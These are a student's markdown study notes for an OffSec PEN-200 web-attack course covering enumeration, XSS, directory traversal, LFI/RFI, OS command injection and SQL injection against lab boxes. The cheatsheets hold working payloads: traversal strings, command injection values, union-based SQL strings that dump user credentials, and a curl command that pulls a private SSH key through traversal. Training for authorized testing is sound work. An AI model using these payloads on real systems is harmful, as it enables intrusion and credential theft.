# Hacktrack - OSA-Pen-200
## Onboarding and Environment Setup
- https://portal.offsec.com/courses/osa-pen-200-39188/learning/hacktrack-onboarding-and-environment-setup-214407/hacktrack-onboarding-and-environment-setup-214409
---

For drawing : app.diagrams.net
### Cheatsheet
```bash
export PROMPT='%F{green}%n@%m%f %F{blue}%~%f %F{yellow}%D{%Y-%m-%d %H:%M:%S:%f MY_TUN0:%F{red}$(ip -4 addr show tun0 | awk "/inet / {print \$2}" | cut -d/ -f1)%f %F{cyan}$%f' 
# source ~/.zshrc

# log terminal
script $(date +%d-%m-%Y).log
exit # when done
```
## 5. Web Application Enumeration Methodology
- https://portal.offsec.com/courses/osa-pen-200-39188/learning/hacktrack-web-application-enumeration-methodology-214449/hacktrack-web-application-enumeration-methodology-214451
---
### Cheatsheet
```bash
# Finding list of user agents inside seclists repo: 
find . -type f -name "*agent*" 2>/dev/nul
# Forced browsing: 
feroxbuster -u http://offsecwp/ -t 1 --rate-limit 1 --random-agent --no-recursion -q -o url-ferox.txt

# Gathering list of API endpoints wfuzz
wfuzz -c -z file,big.txt --hc 404 -p "127.0.0.1:8080:HTTP" "http://192.168.50.16:5002/FUZZ/v1"
# Enumerating Methods on discovered API endpoints
feroxbuster -u http://192.168.104.16:5002/ -w api.txt --no-recursion -q -o api-method-ferox.txt -m GET,POST,PUT
```

## 6. Hacktrack: Web Application Fuzzing and XSS
- https://portal.offsec.com/courses/osa-pen-200-39188/learning/hacktrack-web-application-fuzzing-and-xss-214459/hacktrack-web-application-fuzzing-and-xss-214461
---
### (XHR): XMLHttpRequest 
XHR is used to send (e.g., POST, PUT) and receive (e.g., GET) data asynchronously from the server.
DOM-based XSS often occurs when an application uses client-side JavaScript to take data from an untrusted source (like a URL fragment, or data received via XHR) and passes it to a dangerous sink (like innerHTML, document.write, or jQuery.html())
XHR is the pipe through which data flows; in XSS, you're looking for where that data can be maliciously injected into the pipe or where the application breaks when the data coming out of the pipe is a harmful script.

PayloadAllTheThings XSS Injection:https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
### Cheatsheet
```bash
# Testing on HTTP Headers:User-Agent: 
<script>alert(42)</script>
#Testing with wfuzz:
wfuzz -c -z file,/usr/share/seclists/Fuzzing/XSS/human-friendly/XSS-payloadbox.txt -p"127.0.0.1:8080:HTTP" "http://127.0.0.1/?name=FUZZ"

```

## 7. Hacktrack: Common Web Application Attacks
- https://portal.offsec.com/courses/osa-pen-200-39188/learning/hacktrack-common-web-application-attacks-214496/hacktrack-common-web-application-attacks-214497
---
### Dir traversal
Goal: To read or access files outside the web application's root directory.  
How: manipulate user-supplied input (like a filename in a URL parameter) by injecting the sequence ../ (or ..\ on Windows) to move up to parent directories in the file system.

### LFI - local file inclusion
Goal: To trick the web application into executing code from a file.  
How: uses DIR traversal techniques to reach local, non-web-root file  

### RFI - local file inclusion
Goal: Execute a file hosted on a remote server (controlled by the attacker).  
How: attacker provides a full URL pointing to a malicious script they control, and the vulnerable application fetches and executes it.  

### OS Command Injection
Goal: To execute commands (like ls, id, rm, or net user) directly on the server's operating system (OS).  
How: injects shell metacharacters (e.g., ;, &, |, &&) into an input field that the application then passes to a system function for execution. This causes the OS to see and run multiple distinct commands.

### Cheatsheet
```bash
# Directory Traversal
../../../../etc/passwd # Linux
..\\..\\..\\..\\windows\\win.ini # Windows
../../../../var/log/auth.log # Linux log file for poisoning

# LFI RFI fuzzing
ffuf -u https://example.com/cms/login.php?language=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
# /usr/share/seclists/Fuzzing/LFI/LFI-Windows-adeadfed.txt
# -ac : Autocalibration: will attempt to automatically filter out
# -fs 1234 : run the command once,  note the size of the invalid responses error paages

# OS Command injection 
# (` ; &  | && ||) input field or get/put, adding /injecting  metacharacters
127.0.0.1 `whoami`
127.0.0.1; whoami
127.0.0.1 || whoami
127.0.0.1 | whoami
```
## 8. Hacktrack: Assembling The Pieces Part 1  
- https://portal.offsec.com/courses/osa-pen-200-39188/learning/hacktrack-assembling-the-pieces-part-1-214527/hacktrack-assembling-the-pieces-part-1-214528
- Boxes: DVR4, : helpdesk, law
- Additional practice (when ready): Apex, xposedapi, reconstruction, slort, payday, uc404
---
### SSH /22
```bash
ls -1 /usr/share/nmap/scripts/ssh
sudo nmap -p 22 --script ssh-auth-methods 192.168.IP
``` 
### RSYNC / TCP 873
- daemon similar to SMB
```bash
rsync -av --list-only rsync://192.168.50.234/
rsync -av rsync://192.168.50.234:873/<file> <destination>
```
### Cheatsheet
```bash
# directories and files, not recursive
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://vanity.offsec/FUZZ/
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-files-lowercase.txt-u http://vanity.offsec/uploads/FUZZ
# feroxbuster probably better here, as uses medium word list, we can add extensions -x php,html,js,txt etc..
# ferox default depth is 4

# SMB linux anonymous/no credntial check
nxc smb 192.168.IP --username '' --password ''
enum4linux 192.168.IP

# Inspect with curl 
curl -s http://192.168.IP:8080/about.html | html2te

# Fuzzing DIR Traversal/LFI, send through burp -p
wfuzz -c -z file,win-path.txt --hc 404 -p "127.0.0.1:8080:HTTP" "http://192.168.50.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=FUZZ"
ffuf -c -w win-path.txt -fc 404 -x http://127.0.0.1:8080 "http://192.168.50.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=FUZZ"

# ffuf, -c colorize, -fc filter code, -x proxy, 
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt				# Linux
/usr/share/seclists/Fuzzing/LFI/LFI-Windows-adeadfed.txt	# Windows
/usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt				# sqli 

# Data ssh id_rsa Exfil with Curl, send through BURP proxy -x, silent -s
curl -s"http://192.168.IP:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FUsers%2Fviewer%2F%2Essh%2Fid_rsa" -x http://localhost:8080
```
## 9,10 Hacktrack: SQL Injection Attacks
 - https://portal.offsec.com/courses/osa-pen-200-39188/learning/hacktrack-sql-injection-attacks-214535/hacktrack-sql-injection-attacks-214536
- Boxes : butch, Hepet
- Additional practice (when ready): hawat, pebbles, megavolt
## Resources
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-blind
- https://portswigger.net/web-security/sql-injection/cheat-sheet
- https://pentestmonkey.net/category/cheat-sheet/sql-injection
- https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html

## Blind SQLi
- SQL injection with *NO* direct output from the DB
- Error messages and output are hidden
- Relies on behavioral responses from the application.
- Inference is made from TRUE | FALSE outcomes or response time.

## Blind vs Time based Blind SQL Injection
### Boolean-based
- Forces the application to ask the database a True or False question about a piece of data.
- Attack Logic:injects a conditional query:
- Query example: 
```bash
user=offsec' or 2>3 --+-
user=offsec' or 2<3 --+-
user=offsec' or 2<3 --+-/
AND (SELECT password FROM users WHERE username='admin') LIKE 'a%'.
```
 - True Result: If  TRUE (e.g., the first character of the password is 'a'), the overall SQL query is valid, and the web application behaves normally (e.g., displays the full page).
 - False Result: If  FALSE, the overall query returns zero results, and the web application loads a different page (e.g., an error page, or a page with less content).
- By observing these content differences, the attacker can deduce the data one character (or one bit) at a time.

### Time-based
- Use when the application's response is identical for both True and False conditions, leaving the attacker with no visual signal
- Attack Logic: use a database function (like SLEEP(5) in MySQL or WAITFOR DELAY '0:0:5' in MSSQL) combined with a conditional statement.
- Query Example: 
```bash
SELECT * FROM users WHERE user='offsec'AND IF(1=1,SLEEP(2),0) --+-';
user=tester'or IF(2<3,SLEEP(2),'true') --+//
```
  - True result: you will observe 5-second delay in the response.
  - False result: immediate response
- By measuring the response time, the attacker can infer information

## 11. Hacktrack: Assembling The Pieces Part 2
- https://portal.offsec.com/courses/osa-pen-200-39188/learning/hacktrack-assembling-the-pieces-part-2-215286/hacktrack-assembling-the-pieces-part-2-215288
Boxes : Cockpit, Pebbles
---
### Cockpit / Pebbles

#### Web Application Attacks - Union-based SQL Injection
- Union-based SQL Injection○Uses the UNION SQL operator to combine results of a malicious query with the original query.
- *Prerequisites* for Union-Based SQL Injection
1. The **number** of columns in our UNION SELECT payload should match the number of columns in the original SQL query.
2. The **data type** of the columns in the UNION SELECT payload should match the data type in the original SQL query.
3. Identify the **displayed** columns and inject into a **visible** column


```bash
# nmap sS and sU
# ferox file/directory brute force enum
whatweb -v http://192.168.IP/
curl -I http://192.168.IP/robots.txt
curl -I http://192.168.IP/sitemap.xml


# SQL stuff
# fuzzing quick SQLi payloads
ffuf -w /usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt:FUZZ -d "username=FUZZ&password=bar" -u http://192.168.IP/login.php -x http://127.0.0.1:8080
# fuzzing quick special chars
ffuf -w /usr/share/seclists/Fuzzing/special-chars.txt:FUZZ -d "username=FUZZ&password=bar" -u http://192.168.IP/login.php -x http://127.0.0.1:8080

'order+by+6-- 
'+union+select+'A1','B2','C3','D4','D5'--+-
'+union+select+'A1',database(),'C3','D4','D5'--+-
'+union+select+'A1',table_name,'C3','D4','D5'+from+information_schema.tables+where+table_schema=database()--+-
'+union+select+'A1',column_name,'C3','D4','D5'+from+information_schema.columns+where+table_name='users'--+-
'+union+select+'A1',group_concat(name,'@@',username,'@@',password),'C3','D4','D5'+from+users--+-
``

